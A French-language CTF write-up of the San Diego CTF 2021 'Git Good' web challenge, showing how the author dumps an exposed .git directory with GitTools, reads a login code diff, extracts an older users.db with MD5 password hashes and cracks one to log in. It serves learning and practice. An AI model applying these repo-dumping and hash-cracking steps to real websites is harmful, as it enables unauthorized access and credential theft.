---
layout: post
title: San Diego CTF 2021 - Git Good
subtitle: Challenge Web
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
tags: [CTF, Write-Up, Git, GitTools, Dump, Web App, SQLite, MD5]
---

![Git-good-1.png](/img/Git-good-1.png)

**Le San Diego CTF 2021 s'est tenu du 8 au 10 mai 2021. Parmis les challenges proposés, je me suis penché sur le chall web Git-Good, un challenge plutôt sympa permettant d'exploiter un repo Git.**

# Énoncé

![Git-good-2.png](/img/Git-good-2.png)

# Solution

robots.txt:

![Git-good-3.png](/img/Git-good-3.png)

admin.html:

![Git-good-4.png](/img/Git-good-4.png)

2 inputs: email et password

repo git:

Il est possible de récupérer les fichiers du .git avec le [Dumper de GitTools](https://github.com/internetwache/GitTools/tree/master/Dumper){:target="_blank"}

`./gitdumper.sh https://cgau.sdc.tf/.git/ app`

![Git-good-5.png](/img/Git-good-5.png)

La commande `git show` nous permet d'afficher le code source:

~~~
root@Host-001:/tmp/app/.git# git show
commit 0b23360a5d79ecf5241fd6790edd619304825b9a (HEAD -> master)
Author: Aaron <aaron@cgau.sdc.tf>
Date:   Sat Jan 16 12:58:53 2021 -0800

    Upgraded to bcrypt

diff --git a/app.js b/app.js
index 9a55d59..2c55d1c 100644
--- a/app.js
+++ b/app.js
@@ -3,6 +3,7 @@ const express = require('express')
 const bodyParser = require('body-parser')
 const sqlite3 = require('sqlite3').verbose()
 const md5 = require('md5')
+const bcrypt = require('bcrypt')
 
 // initial configs
 const app = express()
@@ -19,19 +20,26 @@ app.use(bodyParser.urlencoded({extended: true}))
 app.post('/login', (req, res) => {
     const email = req.body.email
     const password = md5(req.body.password)
-    const sql = `SELECT email, password FROM users WHERE email = ? AND password = ?`
+    const sql = `SELECT email, password FROM users WHERE email = ?`
 
     console.log("email: " + email)
-    console.log("password: " + password)
     
-    db.get(sql, [email, password], (err, row) => {
+    db.get(sql, [email], (err, row) => {
         if(err) {
             console.log('ERROR', err)
             res.sendStatus(401)
         } else if (!row) {
             res.sendStatus(401)
         } else {
-            res.sendFile( __dirname + '/secret.flag')
+            bcrypt.compare(password, row.password, (err, result) => {
+                if(err) {
+                    console.log(err)
+                    res.sendStatus(401)
+                } else if (!result)
+                    res.sendStatus(401)
+                else
+                    res.sendFile( __dirname + '/secret.flag')
+            })
         }
     })
 })
diff --git a/package-lock.json b/package-lock.json
index 20c9f02..6aab316 100644
--- a/package-lock.json
+++ b/package-lock.json
(...)
diff --git a/package.json b/package.json
index 9596c82..6a70ab0 100644
--- a/package.json
+++ b/package.json
@@ -9,6 +9,7 @@
   "author": "KNOXDEV",
   "license": "MIT",
   "dependencies": {
+    "bcrypt": "^5.0.0",
     "express": "^4.17.1",
     "md5": "^2.2.1",
     "sqlite3": "^4.1.1"
diff --git a/users.db b/users.db
index 84f1914..b1532f7 100644
Binary files a/users.db and b/users.db differ
root@Host-001:/tmp/app/.git# 
~~~

On voit qu'il existe une base de donnée sqlite3 nommée users.db. Cette DB n'est pas directement accessible:

![Git-good-6.png](/img/Git-good-6.png)

Bien qu'on ne puisse pas accéder directement à cette base de donnée, il est possible de la récupérer en utilisant à nouveau GitTools et son outil [Extractor](https://github.com/internetwache/GitTools/tree/master/Extractor){:target="_blank"}

Remarque: Un grand Merci à [anandrajaram21](https://github.com/anandrajaram21){:target="_blank"} pour m'avoir orienté vers l'Extractor de GitTools :)

`./extractor.sh app/ extract/`

Nous pouvons désormais consulter le contenu des bases de données, notamment celle ou les mots de passe sont en MD5:

~~~
root@Host-001:/tmp# sqlite3 /tmp/extract//0-d8eb39e3e2bb984ce687768d20f58d962942841d/users.db
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> select * from users;
1|aaron@cgau.sdc.tf|e04efcfda166ec49ba7af5092877030e
2|chris@cgau.sdc.tf|c7c8abd4980ff956910cc9665f74f661
3|yash@cgau.sdc.tf|b4bf4e746ab3f2a77173d75dd18e591d
4|rj@cgau.sdc.tf|5a321155e7afbf0cfacf1b9d22742889
5|shawn@cgau.sdc.tf|a8252b3bbf4f3ed81dbcdcca78c6eb35
sqlite> 
~~~

Nous trouvons notamment le mot de passe de aaron@cgau.sdc.tf

![Git-good-7.png](/img/Git-good-7.png)

e04efcfda166ec49ba7af5092877030e correspond à 'weakpassword'

![Git-good-8.png](/img/Git-good-8.png)

**Poursuivez avec :** 

- [JISCTF 2020 - Quals](https://0xss0rz.github.io/2020-11-22-JISCTF-2020-Quals/)

- [Attack Detection Fundamentals - Initial Access Lab 3](https://0xss0rz.github.io/2021-01-06-Attack-Detection-Initial-Access-3/)

- [Hack The Box - Remote](https://0xss0rz.github.io/2020-08-23-HTB-Remote/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
